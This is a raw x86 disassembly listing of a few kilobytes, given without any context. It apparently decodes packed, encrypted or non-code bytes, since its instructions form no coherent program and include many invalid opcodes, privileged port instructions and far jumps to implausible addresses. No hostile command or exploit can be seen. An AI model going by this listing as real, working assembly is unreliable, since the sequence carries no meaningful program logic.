  40a38e:	shl    edi,0x63
  40a391:	enter  0xff1c,0xe1
  40a395:	inc    ebx
  40a396:	sbb    esi,DWORD PTR [ebp+0x58]
  40a399:	cs xchg ecx,eax
  40a39b:	sti    
  40a39c:	xor    al,0x94
  40a39e:	lock adc DWORD PTR [ebx+0x7d],eax
  40a3a2:	jnp    0x40a3cf
  40a3a4:	cmp    eax,DWORD PTR [edi]
  40a3a6:	pushf  
  40a3a7:	sbb    edx,DWORD PTR [esi+0x27]
  40a3aa:	xchg   DWORD PTR [edx],edx
	...
  40a3c0:	sub    eax,DWORD PTR [edi]
  40a3c2:	mov    BYTE PTR [ebx],bl
  40a3c4:	ds daa 
  40a3c6:	ja     0x40a3da
  40a3c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a3c9:	xchg   esp,eax
  40a3ca:	push   ss
  40a3cb:	adc    ebx,DWORD PTR [ecx+0x189d878c]
  40a3d1:	jge    0x40a442
  40a3d3:	jle    0x40a3a4
  40a3d5:	fdiv   DWORD PTR [esi-0x207431c4]
  40a3db:	mov    eax,0x90637006
  40a3e0:	xchg   edi,eax
  40a3e1:	xchg   esi,eax
  40a3e2:	mov    cl,0xe4
  40a3e4:	loop   0x40a3ec
  40a3e6:	rcl    BYTE PTR [edx],1
  40a3e8:	popa   
  40a3e9:	mov    WORD PTR [edi-0x46],es
  40a3ec:	add    edi,DWORD PTR [ebp+0x27]
  40a3ef:	adc    al,BYTE PTR [ecx-0x5c]
  40a3f2:	cs cwde 
  40a3f4:	mov    ebp,DWORD PTR [edi+eax*2+0x10]
  40a3f8:	mov    ebx,0x83981f7c
  40a3fd:	jge    0x40a39c
  40a3ff:	sti    
  40a400:	mov    bl,0x37
  40a402:	or     eax,0x7d7ca312
  40a407:	repz call 0xe77d:0x461be806
  40a40f:	adc    DWORD PTR [edi],edx
  40a411:	loop   0x40a406
  40a413:	jp     0x40a3a3
  40a415:	jnp    0x40a474
  40a417:	hlt    
  40a418:	jp     0x40a41c
  40a41a:	call   0xc7baa93a
  40a41f:	adc    DWORD PTR [edi],ecx
  40a421:	cli    
  40a422:	sti    
  40a423:	add    al,0x0
	...
  40a435:	add    BYTE PTR [eax],al
  40a437:	add    dl,bl
  40a439:	mov    ds:0x7b8b97b6,al
  40a43e:	or     DWORD PTR [eax+edx*2],edi
  40a441:	je     0x40a4b4
  40a443:	lods   al,BYTE PTR ds:[esi]
  40a444:	popf   
  40a445:	jnp    0x40a43d
  40a447:	sbb    al,0x38
  40a449:	jnp    0x40a4c7
  40a44b:	icebp  
  40a44c:	xchg   edi,eax
  40a44d:	jmp    0x7bde3b45
  40a452:	jl     0x40a44d
  40a454:	or     DWORD PTR [ebp+esi*8-0x778bd804],esp
  40a45b:	pop    ecx
  40a45c:	jge    0x40a4d9
  40a45e:	idiv   ah
  40a460:	pop    ds
  40a461:	jnp    0x40a4df
  40a463:	loope  0x40a40c
  40a465:	xchg   BYTE PTR [esi-0x34b2629a],al
  40a46b:	stc    
  40a46c:	(bad)  
  40a46d:	loope  0x40a3f0
  40a46f:	inc    ebp
  40a470:	popf   
  40a471:	add    DWORD PTR ds:0x7c7b8ec3,eax
  40a477:	icebp  
  40a478:	xchg   esi,esi
  40a47a:	cwde   
  40a47b:	ds jge 0x40a4f9
  40a47e:	jl     0x40a465
  40a480:	jl     0x40a483
  40a482:	add    DWORD PTR [ecx+0x75],eax
  40a485:	jp     0x40a47d
  40a487:	es inc ecx
  40a489:	loope  0x40a4a3
  40a48b:	jo     0x40a41f
  40a48d:	jnp    0x40a50b
  40a48f:	in     eax,0x9c
  40a491:	add    DWORD PTR [ecx],eax
  40a493:	add    DWORD PTR [ebp+0x7a],esp
  40a496:	test   BYTE PTR [esi],0x21
  40a499:	loope  0x40a4b7
  40a49b:	jo     0x40a49d
	...
  40a4ad:	add    BYTE PTR [eax],al
  40a4af:	add    BYTE PTR [edx+0x7ce57c7b],dl
  40a4b5:	add    DWORD PTR [ecx],eax
  40a4b7:	add    ebp,edx
  40a4b9:	jp     0x40a4b1
  40a4bb:	out    0x0,al
  40a4bd:	loop   0x40a4cf
  40a4bf:	jo     0x40a452
  40a4c1:	dec    ebp
  40a4c2:	retf   
  40a4c3:	std    
  40a4c4:	(bad)  
  40a4c5:	loope  0x40a448
  40a4c7:	mov    ebp,0xe55010
  40a4cc:	cmp    DWORD PTR ds:0x194175f7,0x9
  40a4d3:	call   DWORD PTR [eax-0x1ae61188]
  40a4d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a4da:	cmc    
  40a4db:	jmp    DWORD PTR [eax+0x3d75f77c]
  40a4e1:	lahf   
  40a4e2:	or     BYTE PTR [edi-0xf7e5be6],0xc
  40a4e9:	dec    eax
  40a4ea:	or     DWORD PTR [eax],eax
  40a4ec:	xor    eax,0xa6144bf8
  40a4f1:	dec    edi
  40a4f2:	div    BYTE PTR [eax+eiz*1-0x62]
  40a4f6:	ds add ebp,esi
  40a4f9:	xchg   esi,eax
  40a4fa:	int    0x45
  40a4fc:	imul   edx,DWORD PTR [edi-0x61afff8],0xa435fc4b
  40a506:	jnp    0x40a51c
  40a508:	pop    edx
  40a509:	and    al,BYTE PTR [esi]
  40a50b:	jmp    DWORD PTR [eax]
  40a50d:	jg     0x40a4fd
  40a50f:	repnz fwait
  40a511:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a512:	cmc    
  40a513:	mov    eax,DWORD PTR [eax]
	...
  40a525:	add    BYTE PTR [eax],al
  40a527:	add    BYTE PTR [ebp-0x4a038bf0],bl
  40a52d:	and    ch,BYTE PTR [ebx]
  40a52f:	push   0x492a31
  40a534:	call   0x915:0xb5e8f222
  40a53b:	add    BYTE PTR [esi-0x2f2842a],ch
  40a541:	cli    
  40a542:	push   ebx
  40a543:	inc    ecx
  40a544:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a545:	mov    ds:0xa48dfc7b,eax
  40a54a:	mov    BYTE PTR [eax],al
  40a54c:	jne    0x40a54d
  40a54e:	dec    ebx
  40a54f:	in     al,dx
  40a550:	pop    esi
  40a551:	xchg   edx,eax
  40a552:	int    0x45
  40a554:	dec    ecx
  40a555:	xchg   ecx,eax
  40a556:	or     BYTE PTR [eax],al
  40a558:	mov    WORD PTR [ebx-0x75],gs
  40a55b:	jge    0x40a5d5
  40a55d:	ins    BYTE PTR es:[edi],dx
  40a55e:	sahf   
  40a55f:	pop    ss
  40a560:	hlt    
  40a561:	ins    BYTE PTR es:[edi],dx
  40a562:	or     ch,bh
  40a564:	sbb    bh,BYTE PTR [ebx]
  40a566:	nop
  40a567:	or     esp,DWORD PTR [ecx+eiz*2+0x7d]
  40a56b:	dec    DWORD PTR [ebx+0x2b]
  40a56e:	nop
  40a56f:	sti    
  40a570:	inc    ebx
  40a571:	cdq    
  40a572:	or     al,ch
  40a574:	sar    ah,0x5
  40a577:	jmp    DWORD PTR ds:0x8c000cf7
  40a57d:	idiv   BYTE PTR [edi+0xa540f13]
  40a583:	jne    0x40a516
  40a585:	and    al,0x8f
  40a587:	add    BYTE PTR [ebx+ebp*2+0x454f],cl
	...
  40a59e:	add    BYTE PTR [eax],al
  40a5a0:	add    al,0x6c
  40a5a2:	or     al,BYTE PTR [eax]
  40a5a4:	mov    WORD PTR [edx+0x6b8cf3bf],gs
  40a5aa:	or     al,BYTE PTR [eax]
  40a5ac:	retf   
  40a5ad:	sub    BYTE PTR [edx],bl
  40a5af:	add    BYTE PTR [ebx+ebp*2-0x44b672f6],cl
  40a5b6:	mov    esp,0xbcbf518c
  40a5bb:	mov    WORD PTR [ecx-0x3d],cs
  40a5be:	mov    esp,0x75f41fe
  40a5c3:	jne    0x40a559
  40a5c5:	mov    ds:0x9abbfe2b,eax
  40a5ca:	mov    DWORD PTR [ebp-0x60],edi
  40a5cd:	imul   ebx,DWORD PTR [esi+0x2090f32],0x0
  40a5d4:	sbb    BYTE PTR [eax-0x75],ah
  40a5d7:	jge    0x40a579
  40a5d9:	imul   edx,DWORD PTR [ecx+0x1a010f05],0x0
  40a5e0:	add    BYTE PTR [ebp+0x7],cl
  40a5e3:	jne    0x40a569
  40a5e5:	xchg   esp,eax
  40a5e6:	out    dx,al
  40a5e7:	cwde   
  40a5e8:	xchg   DWORD PTR [ebx+esi*8+0x74],ebp
  40a5ec:	jae    0x40a667
  40a5ee:	fistp  WORD PTR [eax+0x5d795f]
  40a5f4:	je     0x40a582
  40a5f6:	push   eax
  40a5f7:	push   cs
  40a5f8:	pop    ebx
  40a5f9:	jns    0x40a638
  40a5fb:	adc    al,0x53
  40a5fd:	(bad)  
  40a5fe:	jmp    0x40a61b
  40a600:	dec    ecx
  40a601:	and    al,0xa7
  40a603:	push   cs
	...
  40a618:	inc    ebx
  40a619:	jmp    DWORD PTR [edi-0x68dad1e5]
  40a61f:	push   cs
  40a620:	xor    edi,edi
  40a622:	xchg   ebx,eax
  40a623:	sbb    eax,DWORD PTR [esi+0x25]
  40a626:	xchg   DWORD PTR [esi],ecx
  40a628:	and    edi,edi
  40a62a:	outs   dx,DWORD PTR ds:[esi]
  40a62b:	sbb    edi,DWORD PTR [esi]
  40a62d:	and    eax,0x8dc30e77
  40a632:	jle    0x40a632
  40a634:	adc    bh,ah
  40a636:	pushw  cs
  40a638:	add    edx,DWORD PTR ds:0x8c1fed
  40a63e:	neg    BYTE PTR [ecx-0x2a860d]
  40a644:	repz in eax,dx
  40a646:	outs   dx,DWORD PTR ds:[esi]
  40a647:	push   cs
  40a648:	jecxz  0x40a637
  40a64a:	fisttp WORD PTR [esi]
  40a64c:	popa   
  40a64d:	mov    BYTE PTR [edi-0x5d],dl
  40a650:	add    edi,DWORD PTR [ecx+0x3f]
  40a653:	cdq    
  40a654:	retf   
  40a655:	jns    0x40a614
  40a657:	jmp    FWORD PTR [ebx-0x44f1901f]
  40a65d:	js     0x40a5fc
  40a65f:	shld   DWORD PTR [esi],edx,0x73
  40a663:	push   cs
  40a664:	stos   DWORD PTR es:[edi],eax
  40a665:	leave  
  40a666:	jmp    0x9b0d:0x4d0f9315
  40a66d:	js     0x40a606
  40a66f:	lods   eax,DWORD PTR ds:[esi]
  40a670:	les    edx,FWORD PTR [ebp+0x9]
  40a673:	(bad)  [edi+0xdfd81e1]
  40a679:	push   ecx
  40a67a:	in     eax,dx
  40a67b:	aas    
	...
  40a690:	mov    DWORD PTR [ecx],eax
  40a692:	add    ecx,edx
  40a694:	and    eax,0xe7d6f60b
  40a699:	sar    esp,1
  40a69b:	push   0x13
  40a69d:	test   BYTE PTR [ecx],bl
  40a69f:	cmp    dl,BYTE PTR [esi+0x40]
  40a6a2:	or     cl,ch
  40a6a4:	(bad)  
  40a6a5:	xchg   esp,eax
  40a6a6:	push   esi
  40a6a7:	mov    al,ds:0xae088cce
  40a6ac:	sbb    edx,DWORD PTR [eax+0x77bb14e0]
  40a6b2:	mul    BYTE PTR [esi-0x16f77fb5]
  40a6b8:	(bad)  
  40a6b9:	xchg   esp,eax
  40a6ba:	and    DWORD PTR [eax+edx*4],0xffffffe4
  40a6be:	cmc    
  40a6bf:	cld    
  40a6c0:	pop    ss
  40a6c1:	jo     0x40a6b7
  40a6c3:	ins    BYTE PTR es:[edi],dx
  40a6c4:	xor    DWORD PTR [edi-0x80],0x74139c2c
  40a6cb:	jno    0x40a655
  40a6cd:	add    BYTE PTR ds:0xb7c0b6a,al
  40a6d3:	fisttp DWORD PTR [ecx-0x6daa8bed]
  40a6d9:	inc    BYTE PTR [edx]
  40a6db:	xchg   ecx,eax
  40a6dc:	(bad)  
  40a6dd:	xchg   esp,eax
  40a6de:	or     cl,ch
  40a6e0:	sub    DWORD PTR [ebp-0x35],ecx
  40a6e3:	icebp  
  40a6e4:	(bad)
  40a6e8:	add    BYTE PTR [edi+0x7c],dh
  40a6eb:	loope  0x40a694
  40a6ed:	bound  eax,QWORD PTR [esi+eiz*1+0x21741389]
	...
  40a708:	mov    BYTE PTR [eax],al
  40a70a:	or     eax,0x3004fe2
  40a70f:	push   ecx
  40a710:	(bad)  
  40a711:	xchg   esp,eax
  40a712:	or     BYTE PTR [eax],al
  40a714:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a715:	sub    ecx,eax
  40a717:	ret    0x939d
  40a71a:	mov    DWORD PTR [ebp-0x7f],edi
  40a71d:	mov    ?,WORD PTR [edx+0x1f]
  40a720:	loopne 0x40a771
  40a722:	(bad)  
  40a723:	push   eax
  40a724:	fild   QWORD PTR [eax-0x9]
  40a727:	jne    0x40a7a6
  40a729:	fwait
  40a72a:	mov    es,WORD PTR es:[edx-0x78]
  40a72e:	add    DWORD PTR [ebp+0x3d],0x43
  40a732:	div    DWORD PTR [ebp+0x5d]
  40a735:	fwait
  40a736:	xchg   esi,eax
  40a737:	lea    edx,[edx]
  40a739:	mov    BYTE PTR [edi+0x45],bh
  40a73c:	pop    ecx
  40a73d:	pushf  
  40a73e:	adc    ecx,DWORD PTR [ebp-0xa77798]
  40a744:	cwde   
  40a745:	js     0x40a735
  40a747:	lea    esp,[eax+0x7889f588]
  40a74d:	lods   al,BYTE PTR ds:[esi]
  40a74e:	add    DWORD PTR [ebp-0x3],0x42
  40a752:	pusha  
  40a753:	add    al,0x12
  40a755:	push   ds
  40a756:	push   cs
  40a757:	call   0x36a081
  40a75c:	jo     0x40a7ac
  40a75e:	(bad)  
  40a75f:	push   eax
  40a760:	jb     0x40a780
  40a762:	push   cs
  40a763:	call   0x36351e
  40a768:	pushw  es
  40a76a:	jmp    0x0:0x1
	...
  40a77d:	add    BYTE PTR [eax],al
  40a77f:	add    al,cl
  40a781:	push   0x433d4585
  40a786:	div    DWORD PTR [ebp+0x51]
  40a789:	mov    BYTE PTR [ebx+0xc],bh
  40a78c:	xchg   edx,eax
  40a78d:	push   ds
  40a78e:	push   cs
  40a78f:	call   0x362da7
  40a794:	pusha  
  40a795:	dec    esi
  40a796:	(bad)  
  40a797:	push   eax
  40a798:	jb     0x40a7b8
  40a79a:	push   cs
  40a79b:	call   0x3634e2
  40a7a0:	mov    edx,gs
  40a7a2:	xchg   bh,dh
  40a7a4:	mov    WORD PTR [eax],fs
  40a7a6:	lock mov bh,0x8c
  40a7a9:	ins    DWORD PTR es:[edi],dx
  40a7aa:	or     al,BYTE PTR [eax]
  40a7ac:	xor    al,ah
  40a7ae:	inc    edi
  40a7af:	or     BYTE PTR [eax+esi*8+0x66dcf7ce],cl
  40a7b6:	pushf  
  40a7b7:	sti    
  40a7b8:	jnp    0x40a793
  40a7ba:	lock (bad) 
  40a7bc:	stc    
  40a7bd:	adc    DWORD PTR [edx],0xffffff80
  40a7c0:	imul   ebx,DWORD PTR [edi+0x2],0xd63e183
  40a7c7:	jne    0x40a74f
  40a7c9:	adc    ecx,DWORD PTR ds:0xa06b8c00
  40a7cf:	enter  0x744e,0xa
  40a7d3:	(bad)  
  40a7d4:	leave  
  40a7d5:	inc    ebx
  40a7d6:	mov    ebp,0x1283c1fe
  40a7db:	push   cs
  40a7dc:	add    DWORD PTR [edi],edx
  40a7de:	add    cl,BYTE PTR [ebx+0x6151c]
	...
  40a7f8:	mov    WORD PTR [ebx+0x3],gs
  40a7fb:	jne    0x40a781
  40a7fd:	and    eax,DWORD PTR [eax-0x72]
  40a800:	adc    esi,edi
  40a802:	lds    eax,FWORD PTR [eax+eax*1+0x79]
  40a806:	or     ecx,ebp
  40a808:	sti    
  40a809:	imul   ecx,DWORD PTR [edx],0x0
  40a80c:	(bad)  
  40a80e:	push   cs
  40a80f:	push   es
  40a810:	jle    0x40a7a1
  40a812:	outs   dx,DWORD PTR ds:[esi]
  40a813:	inc    ebp
  40a814:	in     al,0x3b
  40a816:	add    esi,DWORD PTR [ebp-0x6c]
  40a819:	shr    DWORD PTR ds:0x6fcedb8c,cl
  40a81f:	inc    ebp
  40a820:	aam    0x1b
  40a822:	add    esi,DWORD PTR [ebp-0x6c]
  40a825:	rol    esi,cl
  40a827:	stc    
  40a828:	ret    
  40a829:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a82a:	outs   dx,DWORD PTR ds:[esi]
  40a82b:	inc    ebp
  40a82c:	mov    ah,0x94
  40a82e:	scas   eax,DWORD PTR es:[edi]
  40a82f:	or     bh,BYTE PTR [ecx]
  40a831:	mov    WORD PTR [edi],ss
  40a833:	fisub  DWORD PTR [ebp+0x49791f75]
  40a839:	jl     0x40a7eb
  40a83b:	or     ah,BYTE PTR [ecx]
  40a83d:	mov    WORD PTR [edi],ss
  40a83f:	aaa    
  40a840:	xchg   edi,eax
  40a841:	jne    0x40a83a
  40a843:	jl     0x40a816
  40a845:	test   BYTE PTR [ebp-0x3f],ch
  40a848:	jnp    0x40a82e
  40a84a:	out    0x90,al
  40a84c:	xchg   ebx,eax
  40a84d:	ins    BYTE PTR es:[edi],dx
  40a84e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a84f:	push   cs
  40a850:	jae    0x40a8c7
  40a852:	jns    0x40a814
  40a854:	ja     0x40a85d
  40a856:	and    eax,0x5d75bc0c
  40a85b:	cld    
	...
  40a870:	jae    0x40a8b1
  40a872:	retf   
  40a873:	or     dl,BYTE PTR [ebx+0xb]
  40a876:	sub    eax,0xaff70f1c
  40a87b:	add    edi,DWORD PTR [eax+0x27886301]
  40a881:	xchg   esp,eax
  40a882:	adc    ebx,DWORD PTR [ecx+0x397f70e]
  40a888:	mov    al,ds:0x1b8862ed
  40a88d:	xchg   esp,eax
  40a88e:	sbb    esp,DWORD PTR [ebp-0x3ad2e04d]
  40a894:	adc    esi,DWORD PTR [esi-0x3]
  40a897:	adc    esi,esp
  40a899:	sar    ch,cl
  40a89b:	add    ecx,DWORD PTR [ecx+ecx*4-0x13666f61]
  40a8a2:	arpl   WORD PTR [eax-0x6fa96bb4],bp
  40a8a8:	sti    
  40a8a9:	imul   edx,DWORD PTR [eax],0xffffff8a
  40a8ac:	jecxz  0x40a922
  40a8ae:	jmp    0x40a8f3
  40a8b0:	popa   
  40a8b1:	xchg   edi,edx
  40a8b3:	ja     0x40a8e6
  40a8b5:	rcr    edi,cl
  40a8b7:	or     al,BYTE PTR [ecx-0x7c]
  40a8ba:	or     DWORD PTR [ecx-0x4a],eax
  40a8bd:	test   BYTE PTR [eax],0xe9
  40a8c0:	mov    edx,0x17d77d34
  40a8c5:	jne    0x40a8bd
  40a8c7:	push   cs
  40a8c8:	push   ebp
  40a8c9:	jne    0x40a947
  40a8cb:	in     eax,0x87
  40a8cd:	leave  
  40a8ce:	xchg   BYTE PTR [esi],cl
  40a8d0:	xchg   BYTE PTR [ebp+0x7c],dh
  40a8d3:	stc    
	...
  40a8e8:	test   edi,edi
  40a8ea:	add    al,0x11
  40a8ec:	icebp  
  40a8ed:	and    dh,dh
  40a8ef:	not    BYTE PTR [ebp+0xbeee4e9]
  40a8f5:	mov    al,ds:0x73f67ee0
  40a8fa:	neg    dh
  40a8fc:	sbb    edi,DWORD PTR [esi+esi*8+0x5c]
  40a900:	fs jl  0x40a888
  40a903:	pop    edi
  40a904:	test   DWORD PTR [ebx-0xa],esi
  40a907:	cmp    al,0x78
  40a909:	jl     0x40a983
  40a90b:	pop    eax
  40a90c:	xchg   ebp,eax
  40a90d:	jae    0x40a905
  40a90f:	cmp    al,0xa4
  40a911:	jl     0x40a973
  40a913:	pop    eax
  40a914:	test   DWORD PTR [ebx-0xa],esi
  40a917:	sbb    al,0x90
  40a919:	jl     0x40a983
  40a91b:	js     0x40a8b2
  40a91d:	jae    0x40a966
  40a91f:	push   0xb
  40a921:	ins    BYTE PTR es:[edi],dx
  40a922:	or     DWORD PTR ds:0xf6fe9f18,edx
  40a928:	xchg   edx,eax
  40a929:	imul   esi,edi,0x7e
  40a92c:	xchg   ebp,eax
  40a92d:	pop    ds
  40a92e:	dec    esp
  40a92f:	jno    0x40a967
  40a931:	pop    ebp
  40a932:	retf   
  40a933:	loope  0x40a8c4
  40a935:	leave  
  40a936:	adc    DWORD PTR [ebp+0x9],0x1b5ef559
  40a93d:	mov    al,ds:0x7357f5e0
  40a942:	mul    dl
  40a944:	dec    edi
  40a945:	jmp    0x3398a96f
  40a94a:	repnz push eax
	...
  40a960:	pop    ebp
  40a961:	in     eax,dx
  40a962:	cmp    bh,0x7a
  40a965:	popf   
  40a966:	jnp    0x40a964
  40a968:	push   0x23
  40a96a:	add    ch,al
  40a96c:	es repnz cmc 
  40a96f:	call   FWORD PTR [esi+0x7a0f7cd7]
  40a975:	and    ecx,DWORD PTR [esi]
  40a977:	inc    DWORD PTR [eax]
  40a979:	pushf  
  40a97a:	loopne 0x40a903
  40a97c:	mov    BYTE PTR [ebp+0x23b50bf5],bl
  40a982:	idiv   dh
  40a984:	add    BYTE PTR [eax+eiz*8-0xa621278],bl
  40a98b:	leave  
  40a98c:	daa    
  40a98d:	outs   dx,DWORD PTR ds:[esi]
  40a98e:	not    BYTE PTR [esi+ebx*8-0x75]
  40a992:	xchg   esp,eax
  40a994:	add    DWORD PTR [ebp-0xdcd000b],ebx
  40a99a:	mov    al,0xfe
  40a99c:	dec    edx
  40a99d:	pushf  
  40a99e:	or     BYTE PTR [eax],al
  40a9a0:	xor    eax,0x29458197
  40a9a5:	jo     0x40a95d
  40a9a7:	je     0x40a9d9
  40a9a9:	pop    ss
  40a9aa:	xor    DWORD PTR [eax],eax
  40a9ac:	nop
  40a9ad:	jae    0x40a990
  40a9af:	push   ecx
  40a9b0:	xor    al,0x97
  40a9b2:	or     bh,bh
  40a9b4:	sub    BYTE PTR [esi+ebp*8+0x29],0xa9
  40a9b9:	pushf  
  40a9ba:	cmc    
  40a9bb:	or     esp,ebp
  40a9bd:	and    DWORD PTR [edi],eax
  40a9bf:	push   0x492c0d
	...
  40a9d8:	jp     0x40a9fc
  40a9da:	add    ch,al
  40a9dc:	xchg   edx,eax
  40a9dd:	in     al,0xf5
  40a9df:	call   FWORD PTR [esi+0x6a]
  40a9e2:	outs   dx,BYTE PTR ds:[esi]
  40a9e3:	std    
  40a9e4:	cmp    dl,BYTE PTR [esi-0xa]
  40a9e7:	dec    BYTE PTR [eax+edx*2-0x16cb1802]
  40a9ee:	add    bh,bh
  40a9f0:	add    eax,0xcbfe4200
  40a9f5:	mov    cl,0x91
  40a9f7:	cmp    eax,0x8d0a7d8d
  40a9fc:	adc    DWORD PTR [edi+0x2cb3feff],edi
  40aa02:	adc    dl,al
  40aa04:	cld    
  40aa05:	xchg   ecx,eax
  40aa06:	add    BYTE PTR [ebp-0x10040f7],cl
  40aa0c:	fwait
  40aa0d:	sub    al,0x1
  40aa0f:	mov    ch,0xd4
  40aa11:	call   0xff8e:0x7e74ff00
  40aa18:	xor    ebp,0x76
  40aa1b:	mov    esp,0x400e837a
  40aa20:	cmp    edi,0x19
  40aa23:	add    BYTE PTR [ebx+edi*2+0x4a4e9571],cl
  40aa2a:	push   cs
  40aa2b:	jmp    DWORD PTR [ebx+0x7e]
  40aa2e:	cli    
  40aa2f:	call   DWORD PTR [ebx+0x7c]
  40aa32:	xchg   BYTE PTR [ecx+ebx*1-0x42],bh
  40aa36:	ror    BYTE PTR [edi-0x4c],1
  40aa39:	cs mov esi,0x40
	...
  40aa4f:	add    BYTE PTR [ebx+edx*2+0x7b8c7b2e],cl
  40aa56:	repz mov edi,0xa91578a1
  40aa5c:	mov    WORD PTR [ebx+0xa],?
  40aa5f:	lea    eax,[ecx]
  40aa61:	ud0    edx,DWORD PTR ds:[ebx]
  40aa65:	jmp    0x839cd634
  40aa6a:	pop    ss
  40aa6b:	dec    edi
  40aa6c:	dec    ebp
  40aa6d:	jnp    0x40aa81
  40aa6f:	ret    0x7b77
  40aa72:	or     cl,BYTE PTR [ebx]
  40aa74:	int3   
  40aa75:	xchg   esp,eax
  40aa76:	aam    0x0
  40aa78:	cmc    
  40aa79:	and    al,ah
  40aa7b:	add    ecx,DWORD PTR [ecx+esi*2+0x1bf3f7d5]
  40aa82:	jnp    0x40aa8b
  40aa84:	rcr    DWORD PTR [ebp-0x3656ee1],cl
  40aa8a:	jnp    0x40aa48
  40aa8c:	dec    esp
  40aa8d:	xchg   esp,eax
  40aa8e:	ds xchg ecx,eax
  40aa90:	xchg   DWORD PTR [edi+ebp*1+0x73],edi
  40aa94:	mov    bl,0x71
  40aa96:	sbb    edi,edx
  40aa98:	xor    eax,0x97911694
  40aa9d:	jl     0x40aafa
  40aa9f:	jae    0x40aa3c
  40aaa1:	jno    0x40aaf8
  40aaa3:	jno    0x40aa73
  40aaa5:	jb     0x40aab6
  40aaa7:	pop    es
  40aaa8:	sbb    esi,eax
  40aaaa:	ret    
  40aaab:	mov    cl,0xd3
  40aaad:	jl     0x40aaae
  40aaaf:	jb     0x40ab2c
  40aab1:	jno    0x40aa43
  40aab3:	push   es
	...
  40aac8:	stc    
  40aac9:	test   BYTE PTR [edi],ch
  40aacb:	pop    es
  40aacc:	loope  0x40aa6a
  40aace:	xlat   BYTE PTR ds:[ebx]
  40aacf:	or     DWORD PTR [edx+0x71],esp
  40aad2:	fistp  WORD PTR [ebx]
  40aad4:	push   esi
  40aad5:	and    edi,eax
  40aad7:	push   es
  40aad8:	addr16 aad 0x7c
  40aadb:	shl    DWORD PTR [edi+0x1b],0x6d
  40aadf:	dec    edi
  40aae0:	inc    edx
  40aae1:	jno    0x40aaa2
  40aae3:	push   es
  40aae4:	rol    DWORD PTR [esi+eiz*4-0x508e07b0],0x6
  40aaec:	xor    al,0xc7
  40aaee:	adc    eax,DWORD PTR [esp+ecx*4]
  40aaf1:	popf   
  40aaf2:	lahf   
  40aaf3:	(bad)  
  40aaf4:	jae    0x40aaf2
  40aaf6:	pop    ebx
  40aaf7:	mov    ebx,0x908e94cc
  40aafc:	xchg   edi,eax
  40aafd:	jl     0x40ab06
  40aaff:	jae    0x40ab04
  40ab01:	jno    0x40ab0c
  40ab03:	jbe    0x40ab61
  40ab05:	sub    bh,dh
  40ab07:	outs   dx,BYTE PTR ds:[esi]
  40ab08:	mov    al,ah
  40ab0a:	loopne 0x40aaaa
  40ab0c:	pop    esi
  40ab0d:	jno    0x40ab05
  40ab0f:	mov    ecx,0xe17c721f
  40ab14:	ja     0x40aafa
  40ab16:	test   BYTE PTR [esi-0x76],0x7c
  40ab1a:	mov    esp,0x84719276
  40ab1f:	fs dec ebp
  40ab21:	jb     0x40ab19
  40ab23:	push   DWORD PTR ss:[ecx-0x44]
  40ab27:	ins    DWORD PTR es:[edi],dx
  40ab28:	mov    DWORD PTR [ecx-0xa],esi
  40ab2b:	adc    DWORD PTR [eax],eax
	...
  40ab3d:	add    BYTE PTR [eax],al
  40ab3f:	add    BYTE PTR [eax+0xce908ed],dh
  40ab45:	push   esp
  40ab46:	push   es
  40ab47:	ins    BYTE PTR es:[edi],dx
  40ab48:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ab49:	jno    0x40ab41
  40ab4b:	push   cs
  40ab4c:	mov    ah,BYTE PTR [edi]
  40ab4e:	mov    ch,0x7
  40ab50:	xchg   edx,eax
  40ab51:	outs   dx,DWORD PTR ds:[esi]
  40ab52:	loope  0x40ab29
  40ab54:	push   ss
  40ab55:	jo     0x40ab4d
  40ab57:	test   bl,0x2c
  40ab5a:	imul   esi
  40ab5c:	mov    DWORD PTR [esp+ecx*4+0x76],edi
  40ab60:	xchg   ecx,eax
  40ab61:	outs   dx,DWORD PTR ds:[esi]
  40ab62:	shr    BYTE PTR [ebx+0x625d7064],0x74
  40ab69:	adc    eax,0x6f8a99cd
  40ab6e:	imul   BYTE PTR [esi-0x4108d335]
  40ab74:	mov    DWORD PTR [eax+ecx*1+0x4c1b8fe9],edx
  40ab7b:	fnsave [eax+esi*1]
  40ab7e:	jge    0x40ab6c
  40ab80:	shrd   DWORD PTR [eax],ecx,cl
  40ab83:	adc    al,0x23
  40ab85:	jge    0x40ab87
  40ab87:	call   0x91a1401b
  40ab8c:	(bad)  
  40ab8e:	or     BYTE PTR [eax],al
  40ab90:	adc    ah,BYTE PTR [eax]
  40ab92:	add    ch,al
  40ab94:	adc    ah,bl
  40ab96:	cmc    
  40ab97:	jmp    FWORD PTR [edi+ebp*8-0x50]
  40ab9b:	(bad)  
  40ab9c:	bound  ebx,QWORD PTR [ecx-0x6c0bc1a0]
  40aba2:	or     BYTE PTR [ebp+0x0],cl
	...
  40abb8:	push   0x42fff6d2
  40abbd:	sub    dh,ch
  40abbf:	xor    bl,BYTE PTR [bx+di-0x720b]
  40abc4:	cmp    dl,dl
  40abc6:	idiv   bh
  40abc8:	sub    BYTE PTR [eax],0xf7
  40abcb:	mov    ch,0x3d
  40abcd:	xchg   esi,eax
  40abce:	cmc    
  40abcf:	dec    DWORD PTR [ebp-0x5]
  40abd2:	jb     0x40abd4
  40abd4:	mov    ch,0xea
  40abd6:	mov    edi,DWORD PTR [ebx+eax*4-0x4dbf0a67]
  40abdd:	out    dx,eax
  40abde:	into   
  40abdf:	add    BYTE PTR [ebp-0x486a7c6d],ah
  40abe5:	xchg   esi,eax
  40abe6:	cmc    
  40abe7:	(bad)  
  40abe8:	jp     0x40ab7f
  40abea:	sbb    BYTE PTR [eax],al
  40abec:	gs xchg ebx,eax
  40abee:	add    eax,0x898d284
  40abf3:	add    al,ah
  40abf5:	dec    dl
  40abf7:	inc    BYTE PTR [edx-0x68]
  40abfa:	add    DWORD PTR [edx-0x6f],0x28
  40abfe:	outs   dx,BYTE PTR ds:[esi]
  40abff:	repz jb 0x40ac55
  40ac02:	mul    bh
  40ac04:	loope  0x40ac20
  40ac06:	idiv   bh
  40ac08:	sar    DWORD PTR ds:[ebx+0x2],cl
  40ac0c:	dec    esi
  40ac0d:	push   ds
